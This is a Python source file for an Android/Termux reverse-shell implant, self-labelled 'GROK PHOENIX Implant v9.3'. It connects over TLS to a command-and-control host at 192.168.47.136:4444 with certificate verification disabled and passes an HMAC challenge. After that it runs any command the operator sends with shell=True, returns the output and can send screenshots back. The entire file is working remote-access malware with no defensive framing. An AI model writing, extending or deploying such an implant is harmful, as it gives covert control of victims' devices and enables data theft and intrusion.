import socket
import ssl
import os
import time
import threading
import platform
import getpass
import subprocess
import sys
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import hmac
import struct

MASTER_PASSWORD = getpass.getpass("🔑 Enter Master Password (same as listener): ")

def derive_key(password: str) -> bytes:
    return HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b'phoenix_v9_salt_2026',
        info=b'phoenix_key_derivation'
    ).derive(password.encode())

BASE_KEY = derive_key(MASTER_PASSWORD)

class PhoenixProtocol:
    @staticmethod
    def send(conn, msg_type: int, data: bytes):
        payload = struct.pack("!BI", msg_type, len(data)) + data
        conn.sendall(payload)

    @staticmethod
    def recv(conn):
        header = conn.recv(5)
        if not header:
            return None, None
        msg_type, length = struct.unpack("!BI", header)
        data = conn.recv(length)
        return msg_type, data

def execute_full_command(cmd: str) -> bytes:
    try:
        if cmd.strip().startswith("termux-"):
            try:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30, executable='/data/data/com.termux/files/usr/bin/bash')
                return result if result else b"[+] Command executed"
            except:
                pass
        
        if cmd.strip().startswith("screencap"):
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
            if "/sdcard/" in cmd:
                parts = cmd.split()
                if len(parts) > 1:
                    filename = parts[1]
                    try:
                        with open(filename, "rb") as f:
                            return f.read()
                    except:
                        pass
            return result
        
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
        return result if result else b"[+] Command executed with no output"
    except subprocess.CalledProcessError as e:
        return e.output if e.output else f"[-] Command failed with code {e.returncode}".encode()
    except Exception as e:
        return f"[-] Error: {str(e)}".encode()

def shell_handler(conn):
    while True:
        try:
            msg_type, data = PhoenixProtocol.recv(conn)
            if msg_type is None or msg_type == 0xFF:
                print("[-] Session terminated")
                break
            command = data.decode('utf-8', errors='ignore').strip()
            result = execute_full_command(command)
            PhoenixProtocol.send(conn, 0x02, result)
        except Exception:
            break

def main():
    print("[*] GROK PHOENIX Implant v9.3 FULL CONTROL (Mobile) starting...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        s = context.wrap_socket(s, server_hostname='192.168.47.136')
        
        s.connect(('192.168.47.136', 4444))
        print("[*] Connected to C2 via TLS")

        msg_type, challenge = PhoenixProtocol.recv(s)
        if msg_type != 0x01:
            print("[-] Did not receive challenge")
            return

        response = hmac.new(BASE_KEY, challenge, "sha256").digest()
        PhoenixProtocol.send(s, 0x01, response)
        print("[+] Authentication sent successfully")

        print("[+] Connected & Authenticated with C2! 🎉")
        print("[+] FULL CONTROL MODE ACTIVE - All commands allowed!")
        print("[+] Termux API commands available if Termux:API installed")
        
        thread = threading.Thread(target=shell_handler, args=(s,))
        thread.daemon = True
        thread.start()
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    main()
